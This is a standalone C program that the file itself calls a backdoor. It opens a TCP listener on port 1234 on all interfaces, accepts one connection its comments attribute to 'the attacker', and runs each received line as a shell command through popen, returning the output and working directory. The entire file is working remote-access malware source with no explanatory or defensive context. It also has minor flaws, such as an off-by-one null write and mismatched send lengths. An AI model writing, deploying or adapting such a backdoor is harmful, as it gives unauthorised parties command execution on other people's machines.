#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/wait.h>

#define PORT 1234
#define BUFFER_SIZE 1024

int main() {
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char buffer[BUFFER_SIZE];
    char cwd[BUFFER_SIZE];
    char command[BUFFER_SIZE];

    // Create socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("[!] Error creating the socket");
        exit(EXIT_FAILURE);
    }

    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY; // Listen on all interfaces
    server_addr.sin_port = htons(PORT);

    // Bind the socket to the port
    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[!] Error binding the socket");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("[+] Backdoor listening on port %d\n", PORT);

    // Listen for incoming connections
    if (listen(server_fd, 5) < 0) {
        perror("[!] Error listening for connections");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    // Accept connection from the attacker
    if ((client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len)) < 0) {
        perror("[!] Error accepting the connection");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("[+] Connection established with IP: %s, Port: %d\n",
           inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

    // Execute commands
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        int bytes_received = recv(client_fd, buffer, BUFFER_SIZE, 0);
        if (bytes_received <= 0) {
            printf("[!] Connection closed by the attacker\n");
            break;
        }

        buffer[bytes_received] = '\0';

        if (strncmp(buffer, "cd ", 3) == 0) {
            if (chdir(buffer + 3) < 0) {
                perror("[!] Error changing directory");
                send(client_fd, "[!] Error changing directory\n", 30, 0);
            } else {
                getcwd(cwd, sizeof(cwd));
                snprintf(command, sizeof(command), "%s", cwd);
                send(client_fd, command, strlen(command), 0);
            }
        } else {
            FILE *fp = popen(buffer, "r");
            if (fp == NULL) {
                perror("[!] Error executing the command");
                send(client_fd, "[!] Error executing the command\n", 30, 0);
                continue;
            }

            memset(command, 0, BUFFER_SIZE);
            fread(command, 1, BUFFER_SIZE - 1, fp);
            pclose(fp);

            getcwd(cwd, sizeof(cwd));
            strcat(command, cwd);
            strcat(command, ">");
            send(client_fd, command, strlen(command), 0);
        }
    }

    close(client_fd);
    close(server_fd);
    return 0;
}

